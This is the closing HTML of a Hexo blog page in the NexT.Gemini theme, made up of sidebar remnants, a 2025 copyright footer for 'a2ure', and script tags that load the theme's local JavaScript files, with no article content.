      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">categories</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">a2ure</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">23k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">1:23</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
